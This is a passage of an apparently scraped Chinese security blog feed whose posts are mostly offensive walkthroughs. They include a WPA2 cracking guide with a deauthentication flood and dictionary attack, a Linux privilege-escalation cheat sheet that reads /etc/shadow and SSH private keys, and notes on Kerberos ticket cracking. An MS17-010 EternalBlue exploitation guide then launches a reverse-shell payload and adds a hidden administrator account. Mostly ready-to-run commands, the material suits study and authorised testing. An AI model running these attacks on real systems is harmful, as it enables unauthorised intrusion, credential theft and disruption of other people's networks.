alt=""></p><ul><li>由于passwd文件对于系统中的所有用户是可读的，口令比较容易破解，存在较大的安全隐患。</li><li>使用“shadow”文件保存密文的用户口令，“shadow”文件只有管理员用户才可以读取其中的内容。</li></ul><p><strong>登录名：加密口令：最后一次修改时间：最小时间间隔：最大时间间隔：警告时间：不活动时间：失效时间：标志</strong></p><p>（1）帐户名称：和passwd对应，和passwd的意思相同。</p><p>（2）密码：已经加密过的真正的密码，只能看到一些特殊符号。<br><strong>如第一个字符为<code>“*”</code>表示此用户不用来登录，如不想让某账户登录可在前面加个星。</strong></p><ul><li>$1$表明是用MD5加密的</li><li>$2$是用Blowfish加密的</li><li>$5$是用SHA-256加密的</li><li>$6$开头的，表明是用SHA-512加密的，</li></ul><p>（3）上次改动密码的日期：这段记录了改动密码的最后日期。因为Linux计算日期的方法是以1970年1月1日作为1，1971年1月1日就是366，依次类推</p><p>（4）密码不可被改动的天数：必须在这个时间内重新修改密码，否则这个帐号将暂时失效。上面的99999，表示密码不需要重新输入</p><p>（5）密码变更期期限快到前的警告期：当帐号的密码失效期限快到时，系统依据这个字段的设定发出警告，提醒用户：再过n天您的密码将过期，请尽快重新设定密码。默认的是七天。</p><p>（6）帐号失效期</p><p>（7）帐号取消日期</p><p>（8）保留：最后一个字段是保留的，看以后有没有新功能加入。</p><h3 id="etc-group中的信息"><a href="#etc-group中的信息" class="headerlink" title="/etc/group中的信息"></a><code>/etc/group</code>中的信息</h3><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fy4xq811c0j309l0ad77k.jpg" alt=""></p><p>（1）群组名称：就是群组的名称了。</p><p>（2）群组密码：通常不需设定，很少使用群组登录。密码被记录在<code>/etc/gshadow</code>中。</p><p>（3）群组ID：也就是组ID了。</p><p>（4）支持帐号的名称：这个群组的所有帐号</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Linux系统标识与鉴别-安全主体&quot;&gt;&lt;a href=&quot;#Linux系统标识与鉴别-安全主体&quot; class=&quot;headerlink&quot; title=&quot;Linux系统标识与鉴别-安全主体&quot;&gt;&lt;/a&gt;Linux系统标识与鉴别-安全主体&lt;/h1&gt;&lt;h2 id=&quot;安全主体&quot;
      
    
    </summary>
    
      <category term="Linux" scheme="http://yoursite.com/categories/Linux/"/>
    
    
  </entry>
  
  <entry>
    <title>利用airodump-ng和aircrack-ng进行无线破解</title>
    <link href="http://yoursite.com/2018/12/12/%E5%88%A9%E7%94%A8airodump-ng%E5%92%8Caircrack-ng%E8%BF%9B%E8%A1%8C%E6%97%A0%E7%BA%BF%E7%A0%B4%E8%A7%A3/"/>
    <id>http://yoursite.com/2018/12/12/利用airodump-ng和aircrack-ng进行无线破解/</id>
    <published>2018-12-12T09:12:56.000Z</published>
    <updated>2018-12-12T12:15:27.593Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WEP（有线等效保密）认证过程："><a href="#WEP（有线等效保密）认证过程：" class="headerlink" title="WEP（有线等效保密）认证过程："></a>WEP（有线等效保密）认证过程：</h1><ul><li>客户端向接入点发送认证请求</li><li>接入点发回一段明文</li><li>客户端利用事先共享的密钥加密这段明文（对称），并再次发出认证请求</li><li>接入点对数据包进行解密，比较明文，来决定是否接受请求</li></ul><h1 id="WEP2（wifi网络安全接入）安全性："><a href="#WEP2（wifi网络安全接入）安全性：" class="headerlink" title="WEP2（wifi网络安全接入）安全性："></a>WEP2（wifi网络安全接入）安全性：</h1><ul><li>WPA2在密钥足够强的情况下是安全的，过短的密钥仍可能被爆破解出</li><li>WPA2-PSK指的是WPA2个人版，指的是使用事先约定的密钥进行认证的WPA2</li></ul><h1 id="Aircrack-ng抓包及破解WPA2"><a href="#Aircrack-ng抓包及破解WPA2" class="headerlink" title="Aircrack-ng抓包及破解WPA2"></a>Aircrack-ng抓包及破解WPA2</h1><ul><li>虚拟机安装无线网卡</li><li>配置无线网卡</li><li>利用airodump-ng进行抓包</li><li>利用crunch生成字典</li><li>利用aircrack-ng进行爆破</li></ul><p><strong>Aircrack</strong>是破解<code>WEP/WPA/WPA2</code>加密的主流工具之一。<strong>Aircrack-ng</strong>套件包含的工具可用于捕获数据包、握手验证。可用来进行暴力破解和字典攻击。</p><p><strong>Aircrack-ng</strong> 攻击 主要是拿到握手包，用字典破解握手包。</p><p>首先，你得有个无线网卡，然后去自动配置他，操作嘛当然都是在kali虚拟机下进行的。</p><h2 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h2><pre><code>airmon-ng check kill</code></pre><p>kill掉影响网卡的进程，一般情况下，每次重启或者开机后这些进程都会自己开始。</p><p><img src="https://img-blog.csdnimg.cn/20181109163042314.png" alt=""></p><p>将无线网卡模式改为<strong>monitor</strong>模式</p><pre><code>iwconfig wlan0mon mode monitor </code></pre><p><img src="https://img-blog.csdnimg.cn/20181109164030848.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pweWd4MTIz,size_16,color_FFFFFF,t_70" alt=""></p><p>打开网卡：</p><pre><code>airmon-ng start wlan0</code></pre><p><img src="https://img-blog.csdnimg.cn/20181109164205722.png" alt=""></p><p>这时候网卡名为wlan0mon。（mon是monitor的缩写，意思为监控）</p><h2 id="wifi嗅探"><a href="#wifi嗅探" class="headerlink" title="wifi嗅探"></a>wifi嗅探</h2><p>查看当前区域的所有wifi</p><pre><code>airodump-ng wlan0mon</code></pre><p><img src="https://img-blog.csdnimg.cn/2018110916441831.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pweWd4MTIz,size_16,color_FFFFFF,t_70" alt=""></p><ul><li>BSSID：wifi路由的 Mac地址， </li><li>Data 当前wifi数据大小，有数据就表明有人正在使用，你就可以把它作为一个选择了。</li><li>CH ：渠道，后面的攻击要用到。 </li><li>ESSID： wifi的 名字。还有，他的排序是按信号的强弱来排序的，越往上信号越强。PWR 是强度，不用记，慢慢的就知道了。</li></ul><p>经过观察之后选择一个你想破解或者攻击的wifi，前提是它得有数据显示，Date的那列，所以选择攻击的wifi最好先从Date看起来，选择一个有数据的wifi之后按Ctrl+c 停止检测，复制你选择的Mac地址。</p><h2 id="下一步"><a href="#下一步" class="headerlink" title="下一步"></a>下一步</h2><pre><code>airodump-ng --bssid 0C:4B:54:AE:C1:06 -c 11 -w ~/wlan0/qihua wlan0mon</code></pre><blockquote><p>-c 是 渠道  bssid 是路由的Mac地址 -w是放包的目录</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20181109172131528.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pweWd4MTIz,size_16,color_FFFFFF,t_70" alt=""></p><p>可以看到有三个连接。</p><h2 id="洪水攻击（重复不断的攻击）"><a href="#洪水攻击（重复不断的攻击）" class="headerlink" title="洪水攻击（重复不断的攻击）"></a>洪水攻击（重复不断的攻击）</h2><pre><code>aireplay-ng -0 0 -a 0C:4B:54:AE:C1:06 -c CC:2F:71:8C:FA:4B wlan0mon</code></pre><p><strong>-0</strong>表示一直不断的攻击，类似于拒绝服务攻击，占满你的握手请求通道，其他的连接进不来，也可以让当前所有连接断开，-c在这里表示的是client的mac地址。</p><p>攻击的时候不要关闭抓包窗口，注意观察抓包窗口。</p><p><img src="https://img-blog.csdnimg.cn/20181109172327525.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pweWd4MTIz,size_16,color_FFFFFF,t_70" alt=""></p><p>过一会停掉洪水攻击，静等别人连接，出现<code>WPA handshake :</code>  ，就表示成功。如果有连接很快就可以抓到包</p><p><img src="https://img-blog.csdnimg.cn/20181109172929110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pweWd4MTIz,size_16,color_FFFFFF,t_70" alt=""></p><h2 id="抓包信息及爆破"><a href="#抓包信息及爆破" class="headerlink" title="抓包信息及爆破"></a>抓包信息及爆破</h2><p><img src="https://img-blog.csdnimg.cn/20181109173157234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pweWd4MTIz,size_16,color_FFFFFF,t_70" alt=""></p><p>抓到握手包那么就可以用密码字典进行爆破了，爆破的是.cap文件。</p><pre><code>aircrack-ng -w password.txt wlan0/qihua-01.cap</code></pre><p>接下来就静静等待跑包。</p><p><img src="https://img-blog.csdnimg.cn/20181109200738468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pweWd4MTIz,size_16,color_FFFFFF,t_70" alt=""></p><p>完成！密码51201314</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;WEP（有线等效保密）认证过程：&quot;&gt;&lt;a href=&quot;#WEP（有线等效保密）认证过程：&quot; class=&quot;headerlink&quot; title=&quot;WEP（有线等效保密）认证过程：&quot;&gt;&lt;/a&gt;WEP（有线等效保密）认证过程：&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;客户端向接入点发
      
    
    </summary>
    
      <category term="无线安全" scheme="http://yoursite.com/categories/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>GeoIP</title>
    <link href="http://yoursite.com/2018/12/11/GeoIP/"/>
    <id>http://yoursite.com/2018/12/11/GeoIP/</id>
    <published>2018-12-11T10:25:42.000Z</published>
    <updated>2018-12-11T10:28:42.549Z</updated>
    
    <content type="html"><![CDATA[<pre><code>import pygeoipgi = pygeoip.GeoIP(&apos;GeoLiteCity.dat&apos;)def printRecord(tgt):    rec = gi.record_by_name(tgt)    print(rec)    city = rec[&apos;city&apos;]    # region = rec[&apos;region_name&apos;]    country = rec[&apos;country_name&apos;]    long = rec[&apos;longitude&apos;]    lat = rec[&apos;latitude&apos;]    print(&apos;[*] Target: &apos; + tgt + &apos; Geo-located. &apos;)    print(&apos;[+] &apos; + str(city) + &apos;, &apos; + str(country))    print(&apos;[+] Latitude: &apos;+str(lat) + &apos;, Longitude: &apos; + str(long))tgt = &apos;114.242.146.98&apos;printRecord(tgt)</code></pre><p>GeoLiteCity.dat在网上可以免费下载。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;pre&gt;&lt;code&gt;import pygeoip
gi = pygeoip.GeoIP(&amp;apos;GeoLiteCity.dat&amp;apos;)
def printRecord(tgt):
    rec = gi.record_by_name(tgt)
    print(r
      
    
    </summary>
    
      <category term="python脚本" scheme="http://yoursite.com/categories/python%E8%84%9A%E6%9C%AC/"/>
    
    
  </entry>
  
  <entry>
    <title>Linux提权常用命令</title>
    <link href="http://yoursite.com/2018/12/07/Linux%E6%8F%90%E6%9D%83%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <id>http://yoursite.com/2018/12/07/Linux提权常用命令/</id>
    <published>2018-12-07T11:54:21.000Z</published>
    <updated>2018-12-07T13:13:52.631Z</updated>
    
    <content type="html"><![CDATA[<h1 id="操作系统相关"><a href="#操作系统相关" class="headerlink" title="操作系统相关"></a>操作系统相关</h1><h2 id="操作系统类型版本"><a href="#操作系统类型版本" class="headerlink" title="操作系统类型版本"></a>操作系统类型版本</h2><pre><code>cat /etc/issuecat /etc/*-releasecat /etc/lsb-release      # Debian cat /etc/redhat-release   # Redhat</code></pre><h2 id="内核版本-主要看是否为64位"><a href="#内核版本-主要看是否为64位" class="headerlink" title="内核版本(主要看是否为64位)"></a>内核版本(主要看是否为64位)</h2><pre><code>cat /proc/versionuname -auname -mrsrpm -q kerneldmesg | grep Linuxls /boot | grep vmlinuz-</code></pre><h2 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h2><pre><code>cat /etc/profilecat /etc/bashrccat ~/.bash_profilecat ~/.bashrccat ~/.bash_logoutenvset</code></pre><h2 id="查看是否有打印机"><a href="#查看是否有打印机" class="headerlink" title="查看是否有打印机"></a>查看是否有打印机</h2><pre><code>lpstat -a</code></pre><h1 id="应用与服务相关"><a href="#应用与服务相关" class="headerlink" title="应用与服务相关"></a>应用与服务相关</h1><h2 id="查看正在运行的程序及对应的用户权限"><a href="#查看正在运行的程序及对应的用户权限" class="headerlink" title="查看正在运行的程序及对应的用户权限"></a>查看正在运行的程序及对应的用户权限</h2><pre><code>ps auxps -eftopcat /etc/services</code></pre><h2 id="查看以root权限正在运行的程序"><a href="#查看以root权限正在运行的程序" class="headerlink" title="查看以root权限正在运行的程序"></a>查看以root权限正在运行的程序</h2><pre><code>ps aux | grep rootps -ef | grep root</code></pre><h2 id="查看安装了的应用"><a href="#查看安装了的应用" class="headerlink" title="查看安装了的应用"></a>查看安装了的应用</h2><pre><code>ls -alh /usr/bin/ls -alh /sbin/dpkg -lrpm -qals -alh /var/cache/apt/archivesls -alh /var/cache/yum/</code></pre><h2 id="一些服务的配置文件"><a href="#一些服务的配置文件" class="headerlink" title="一些服务的配置文件"></a>一些服务的配置文件</h2><pre><code>cat /etc/syslog.confcat /etc/chttp.confcat /etc/lighttpd.confcat /etc/cups/cupsd.confcat /etc/inetd.confcat /etc/apache2/apache2.confcat /etc/my.confcat /etc/httpd/conf/httpd.confcat /opt/lampp/etc/httpd.confls -aRl /etc/ | awk &apos;$1 ~ /^.*r.*/&apos;</code></pre><h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2><pre><code>crontab -lls -alh /var/spool/cronls -al /etc/ | grep cronls -al /etc/cron*cat /etc/cron*cat /etc/at.allowcat /etc/at.denycat /etc/cron.allowcat /etc/cron.denycat /etc/crontabcat /etc/anacrontabcat /var/spool/cron/crontabs/root</code></pre><h2 id="找存储的明文用户名，密码"><a href="#找存储的明文用户名，密码" class="headerlink" title="找存储的明文用户名，密码"></a>找存储的明文用户名，密码</h2><pre><code>grep -i user [filename]grep -i pass [filename]grep -C 5 &quot;password&quot; [filename]find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot;   # Joomla</code></pre><h1 id="通信与网络相关"><a href="#通信与网络相关" class="headerlink" title="通信与网络相关"></a>通信与网络相关</h1><h2 id="查看当前网络地址"><a href="#查看当前网络地址" class="headerlink" title="查看当前网络地址"></a>查看当前网络地址</h2><pre><code>/sbin/ifconfig -acat /etc/network/interfacescat /etc/sysconfig/network</code></pre><h2 id="查看网络配置，DNS，DHCP，网关"><a href="#查看网络配置，DNS，DHCP，网关" class="headerlink" title="查看网络配置，DNS，DHCP，网关"></a>查看网络配置，DNS，DHCP，网关</h2><pre><code>cat /etc/resolv.confcat /etc/sysconfig/networkcat /etc/networksiptables -Lhostnamednsdomainname</code></pre><h2 id="查看网络通信"><a href="#查看网络通信" class="headerlink" title="查看网络通信"></a>查看网络通信</h2><pre><code>lsof -ilsof -i :80grep 80 /etc/servicesnetstat -antupnetstat -antpxnetstat -tulpnchkconfig --listchkconfig --list | grep 3:onlastw</code></pre><h2 id="查看缓存"><a href="#查看缓存" class="headerlink" title="查看缓存"></a>查看缓存</h2><pre><code>arp -eroute/sbin/route -nee</code></pre><h2 id="tcpdump-网络上的数据包进行截获的包分析工具"><a href="#tcpdump-网络上的数据包进行截获的包分析工具" class="headerlink" title="tcpdump(网络上的数据包进行截获的包分析工具)"></a>tcpdump(网络上的数据包进行截获的包分析工具)</h2><pre><code>tcpdump 默认启动tcpdump -i eth1 监视指定网络接口的数据包tcpdump host 210.27.48.1  接货所有210.27.48.1的主机收到和发出的数据包</code></pre><p>具体用法：<a href="https://www.cnblogs.com/ggjucheng/archive/2012/01/14/2322659.html" target="_blank" rel="noopener">https://www.cnblogs.com/ggjucheng/archive/2012/01/14/2322659.html</a></p><h1 id="用户相关"><a href="#用户相关" class="headerlink" title="用户相关"></a>用户相关</h1><pre><code>idwhowlastcat /etc/passwdcat /etc/groupcat /etc/shadowls -alh /var/mail/grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &apos;$3 == 0 { print $1}&apos;   # 列出超级用户awk -F: &apos;($3 == &quot;0&quot;) {print}&apos; /etc/passwd   #列出超级用户cat /etc/sudoerssudo -l</code></pre><h2 id="列家目录"><a href="#列家目录" class="headerlink" title="列家目录"></a>列家目录</h2><pre><code>ls -ahlR /root/ls -ahlR /home/</code></pre><h2 id="从配置文件里面寻找密码"><a href="#从配置文件里面寻找密码" class="headerlink" title="从配置文件里面寻找密码"></a>从配置文件里面寻找密码</h2><pre><code>cat /var/apache2/config.inccat /var/lib/mysql/mysql/user.MYDcat /root/anaconda-ks.cfg</code></pre><h2 id="看其他用户的操作记录"><a href="#看其他用户的操作记录" class="headerlink" title="看其他用户的操作记录"></a>看其他用户的操作记录</h2><pre><code>cat ~/.bash_historycat ~/.nano_historycat ~/.atftp_historycat ~/.mysql_historycat ~/.php_history</code></pre><h2 id="ssh私钥"><a href="#ssh私钥" class="headerlink" title="ssh私钥"></a>ssh私钥</h2><pre><code>cat ~/.ssh/authorized_keyscat ~/.ssh/identity.pubcat ~/.ssh/identitycat ~/.ssh/id_rsa.pubcat ~/.ssh/id_rsacat ~/.ssh/id_dsa.pubcat ~/.ssh/id_dsacat /etc/ssh/ssh_configcat /etc/ssh/sshd_configcat /etc/ssh/ssh_host_dsa_key.pubcat /etc/ssh/ssh_host_dsa_keycat /etc/ssh/ssh_host_rsa_key.pubcat /etc/ssh/ssh_host_rsa_keycat /etc/ssh/ssh_host_key.pubcat /etc/ssh/ssh_host_key</code></pre><h1 id="文件系统相关"><a href="#文件系统相关" class="headerlink" title="文件系统相关"></a>文件系统相关</h1><h2 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h2><pre><code>ls -alh /var/logls -alh /var/maills -alh /var/spoolls -alh /var/spool/lpdls -alh /var/lib/pgsqlls -alh /var/lib/mysqlcat /var/lib/dhcp3/dhclient.leases</code></pre><h2 id="查看网站文件"><a href="#查看网站文件" class="headerlink" title="查看网站文件"></a>查看网站文件</h2><pre><code>ls -alhR /var/www/ls -alhR /srv/www/htdocs/ls -alhR /usr/local/www/apache22/data/ls -alhR /opt/lampp/htdocs/ls -alhR /var/www/html/</code></pre><h2 id="常见日志文件"><a href="#常见日志文件" class="headerlink" title="常见日志文件"></a>常见日志文件</h2><pre><code>cat /etc/httpd/logs/access_logcat /etc/httpd/logs/access.logcat /etc/httpd/logs/error_logcat /etc/httpd/logs/error.logcat /var/log/apache2/access_logcat /var/log/apache2/access.logcat /var/log/apache2/error_logcat /var/log/apache2/error.logcat /var/log/apache/access_logcat /var/log/apache/access.logcat /var/log/auth.logcat /var/log/chttp.logcat /var/log/cups/error_logcat /var/log/dpkg.logcat /var/log/faillogcat /var/log/httpd/access_logcat /var/log/httpd/access.logcat /var/log/httpd/error_logcat /var/log/httpd/error.logcat /var/log/lastlogcat /var/log/lighttpd/access.logcat /var/log/lighttpd/error.logcat /var/log/lighttpd/lighttpd.access.logcat /var/log/lighttpd/lighttpd.error.logcat /var/log/messagescat /var/log/securecat /var/log/syslogcat /var/log/wtmpcat /var/log/xferlogcat /var/log/yum.logcat /var/run/utmpcat /var/webmin/miniserv.logcat /var/www/logs/access_logcat /var/www/logs/access.logls -alh /var/lib/dhcp3/ls -alh /var/log/postgresql/ls -alh /var/log/proftpd/ls -alh /var/log/samba/</code></pre><h2 id="文件挂载"><a href="#文件挂载" class="headerlink" title="文件挂载"></a>文件挂载</h2><pre><code>mountdf -hcat /etc/fstab</code></pre><h2 id="Find命令"><a href="#Find命令" class="headerlink" title="Find命令"></a>Find命令</h2><pre><code>find / -perm -1000 -type d 2&gt;/dev/null   # 只有目录所有者才可以更改删除find / -perm -g=s -type f 2&gt;/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.find / -perm -u=s -type f 2&gt;/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null    # SGID or SUIDfor i in `locate -r &quot;bin$&quot;`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null; done    # 从下面几个位置: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin 或者其他的bin目录寻找 find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2&gt;/dev/null #从/，SGUD或者SUID开始查找，排除符号链接，深度为3个文件夹，显示详细的清单并去除错误信息</code></pre><h2 id="寻找可写目录"><a href="#寻找可写目录" class="headerlink" title="寻找可写目录"></a>寻找可写目录</h2><pre><code>find / -writable -type d 2&gt;/dev/null      # 可写目录find / -perm -222 -type d 2&gt;/dev/null     # 可写目录 find / -perm -o w -type d 2&gt;/dev/null     # 可写目录find / -perm -o x -type d 2&gt;/dev/null     # 可执行目录find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null   # 可写可执行目录</code></pre><h1 id="准备及攻击"><a href="#准备及攻击" class="headerlink" title="准备及攻击"></a>准备及攻击</h1><h2 id="查看语言支持"><a href="#查看语言支持" class="headerlink" title="查看语言支持"></a>查看语言支持</h2><pre><code>find / -name perl*find / -name python*find / -name gcc*find / -name cc</code></pre><h2 id="查看上传方式"><a href="#查看上传方式" class="headerlink" title="查看上传方式"></a>查看上传方式</h2><pre><code>find / -name wgetfind / -name nc*find / -name netcat*find / -name tftp*find / -name ftp</code></pre><h2 id="寻找exp"><a href="#寻找exp" class="headerlink" title="寻找exp"></a>寻找exp</h2><p><a href="http://www.google.com" target="_blank" rel="noopener"> http://www.google.com</a></p><h2 id="编译及运行exp"><a href="#编译及运行exp" class="headerlink" title="编译及运行exp"></a>编译及运行exp</h2><pre><code>which gccgcc exp.c -o expchmod +x exp./exp</code></pre><h1 id="提权辅助脚本"><a href="#提权辅助脚本" class="headerlink" title="提权辅助脚本"></a>提权辅助脚本</h1><p><a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener">https://github.com/rebootuser/LinEnum</a></p><p><a href="www.securitysift.com/download/linuxprivchecker.py">www.securitysift.com/download/linuxprivchecker.py</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;操作系统相关&quot;&gt;&lt;a href=&quot;#操作系统相关&quot; class=&quot;headerlink&quot; title=&quot;操作系统相关&quot;&gt;&lt;/a&gt;操作系统相关&lt;/h1&gt;&lt;h2 id=&quot;操作系统类型版本&quot;&gt;&lt;a href=&quot;#操作系统类型版本&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
      <category term="内网渗透" scheme="http://yoursite.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>windows安全认证</title>
    <link href="http://yoursite.com/2018/12/06/windows%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81/"/>
    <id>http://yoursite.com/2018/12/06/windows安全认证/</id>
    <published>2018-12-06T03:49:24.000Z</published>
    <updated>2018-12-06T11:14:08.619Z</updated>
    
    <content type="html"><![CDATA[<p>Windows认证协议有两种<strong>NTLM（NT LAN Manager）</strong>和<strong>Kerberos</strong>。</p><ul><li>基于NTML的认证方式,主要用在早期的windows工作组环境中,认证的过程也相对比较简单</li><li>另一种是基于Kerberos的认证方式,主要用在域环境中,下面就这两种不同的认证方式做些简要的通信流程说明</li></ul><h1 id="NTML"><a href="#NTML" class="headerlink" title="NTML"></a>NTML</h1><p>在AD域环境中，如果需要认证Windows NT系统，也必须采用NTLM。较之Kerberos，基于NTLM的认证过程要简单很多。NTLM采用一种<strong>质询/应答</strong>（Challenge/Response）消息交换模式。</p><h2 id="步骤一："><a href="#步骤一：" class="headerlink" title="步骤一："></a>步骤一：</h2><p>用户通过输入Windows帐号和密码登录客户端主机。在登录之前，客户端会缓存输入密码的哈希值，原始密码会被丢弃（“原始密码在任何情况下都不能被缓存”，这是一条基本的安全准则）。成功登录客户端Windows的用户如果试图访问服务器资源，需要向对方发送一个请求。该请求中包含一个以明文表示的用户名。</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxww2smllpj30bj05n3zn.jpg" alt=""></p><h2 id="步骤二："><a href="#步骤二：" class="headerlink" title="步骤二："></a>步骤二：</h2><p>服务器接收到请求后，生成一个16位的随机数。这个随机数被称为Challenge或者Nonce。服务器在将该Challenge发送给客户端之前，该Challenge会先被保存起来。Challenge是以明文的形式发送的。</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxww4hlte4j30bj05n3zn.jpg" alt=""></p><h2 id="步骤三："><a href="#步骤三：" class="headerlink" title="步骤三："></a>步骤三：</h2><p>客户端在接收到服务器发回的Challenge后，用在步骤一中保存的密码哈希值对其加密，然后再将加密后的Challenge发送给服务器。</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxx3b8cngtj30bj05owfn.jpg" alt=""></p><h2 id="步骤四"><a href="#步骤四" class="headerlink" title="步骤四"></a>步骤四</h2><p>服务器接收到客户端发送回来的加密后的Challenge后，会向DC（Domain）发送针对客户端的验证请求。该请求主要包含以下三方面的内容：客户端用户名、客户端密码哈希值加密的Challenge和原始的Challenge。</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxx3cdbtosj309t069js9.jpg" alt=""></p><h2 id="步骤五、六"><a href="#步骤五、六" class="headerlink" title="步骤五、六"></a>步骤五、六</h2><p>DC根据用户名获取该帐号的密码哈希值，对原始的Challenge进行加密。如果加密后的Challenge和服务器发送的一致，则意味着用户拥有正确的密码，验证通过，否则验证失败。DC将验证结果发给服务器，并最终反馈给客户端。</p><h1 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h1><h2 id="Kerberos组件"><a href="#Kerberos组件" class="headerlink" title="Kerberos组件"></a>Kerberos组件</h2><ul><li>KDC：密钥分发中心，保存了所有用户和服务的秘密钥匙。</li><li>AS：认证服务器，为Client生成TGT。</li><li>TGS：票证授予服务，为Client生成Ticket。</li><li>TGT：票证授予票证，用于获取Ticket的票证。</li></ul><h2 id="Kerberos认证流程"><a href="#Kerberos认证流程" class="headerlink" title="Kerberos认证流程"></a>Kerberos认证流程</h2><p>1.客户端向KDC的AS服务请求开身份证明</p><p>2.KAS认证成功后返回给客户端认购权证（TGT）</p><p>3.客户端拿着TGT到KDC的TGS服务买票</p><p>4.TGS认证成功后返回给客户端服务票据（ST）</p><p>5.客户端拿着ST去访问服务</p><p>6.返回服务资源</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxx3ki7z9nj30de090dhp.jpg" alt=""></p><h2 id="SPN票据破解"><a href="#SPN票据破解" class="headerlink" title="SPN票据破解"></a>SPN票据破解</h2><p>在kerberos认证中，如果需要向某个服务发起认证，首先需要获取到TGT，之后拿着这张TGT去获得ST。微软的kerberos认证支持rc4加密，它会使用服务器的ntlm hash作为加密票据的密钥。那么当获取到ST后，就能尝试暴力破解服务器的密码hash。</p><h3 id="破解方法"><a href="#破解方法" class="headerlink" title="破解方法"></a>破解方法</h3><ul><li>RC4加密方式使用tgsrepcrack.py </li><li>AES加密方式通过kirbi2john转换为hash，通过<code>john/hashcat</code>破解</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Windows认证协议有两种&lt;strong&gt;NTLM（NT LAN Manager）&lt;/strong&gt;和&lt;strong&gt;Kerberos&lt;/strong&gt;。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;基于NTML的认证方式,主要用在早期的windows工作组环境中,认证的过程也相对比较简单
      
    
    </summary>
    
      <category term="windows" scheme="http://yoursite.com/categories/windows/"/>
    
    
  </entry>
  
  <entry>
    <title>内网杀器--MS17-010漏洞</title>
    <link href="http://yoursite.com/2018/12/05/%E5%86%85%E7%BD%91%E6%9D%80%E5%99%A8-MS17-010%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2018/12/05/内网杀器-MS17-010漏洞/</id>
    <published>2018-12-05T13:30:13.000Z</published>
    <updated>2018-12-06T08:35:36.911Z</updated>
    
    <content type="html"><![CDATA[<p>受影响的Windows 版本包括Windows NT、Windows 2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8、Windows 2008、Windows 2008 R2、Windows Server 2012 SP0等。</p><h1 id="实战利用："><a href="#实战利用：" class="headerlink" title="实战利用："></a>实战利用：</h1><p>攻击机：kali</p><p>目标机：win764位</p><p>打开msf</p><p>搜索msf17-010模块</p><pre><code>search msf17-010use auxiliary/scanner/smb/smb_ms17_010</code></pre><p><code>show option</code>查看配置选项，需要配置的参数，RHOSTS,THREADS：</p><pre><code>set RHOSTS 192.168.209.0/24set threads 10run</code></pre><p>扫描探测192.168.209网段下存在漏洞的主机：</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxw88o0oqvj30k80b3430.jpg" alt=""></p><p>发现了一个开445端口有漏洞的主机，接下来进入漏洞利用模块并设置payload</p><pre><code>use exploit/windows/smb/ms17_010_eternalblue 设置TCP连接set payload windows/x64/meterpreter/reverse_tcp</code></pre><p>用<code>options</code>查看需要配置的选项rhost和lhost</p><p>配置完后进行攻击：</p><pre><code>exploit</code></pre><p>成功进入</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxw8tykenxj30ji0etwlq.jpg" alt=""></p><p>通过shell对目标机进行控制</p><pre><code>net user abc abc /add </code></pre><p>将用户abc添加入管理组 </p><pre><code>net localgroup administrators abc /add </code></pre><p>开启远程桌面功能 </p><pre><code>REG ADD 